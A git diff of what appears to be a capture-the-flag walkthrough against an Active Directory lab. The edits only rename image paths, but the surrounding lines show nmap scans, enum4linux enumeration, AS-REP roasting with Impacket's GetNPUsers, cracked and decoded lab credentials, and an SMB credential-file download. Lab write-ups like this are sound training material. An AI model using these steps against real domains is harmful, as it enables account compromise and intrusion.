@@ -55,7 +55,7 @@ nmap -A $VICTIM
 nmap -sV -sT -O -p 1-65535 $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (5) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (6) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### netbios-ssn port 139 & microsoft-ds port 445
 
@@ -65,7 +65,7 @@ enum4linux $VICTIM
 
 The NetBIOS-Domain Name of the machine
 
-<figure><img src="../../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Enumerating Users via Kerberos port 88
 
@@ -95,7 +95,7 @@ svc-admin allows us to get a ticket without a password. The hash type is Kerbero
 python3.9 /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile validusers.txt -dc-ip $VICTIM spookysec.local/
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 Cracking the hash we can see the password is management2005
 
@@ -123,7 +123,7 @@ smb: \> dir
 smb: \> get backup_credentials.txt 
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Its a base64 encoded username and password. backup@spookysec.local:backup2517860
 
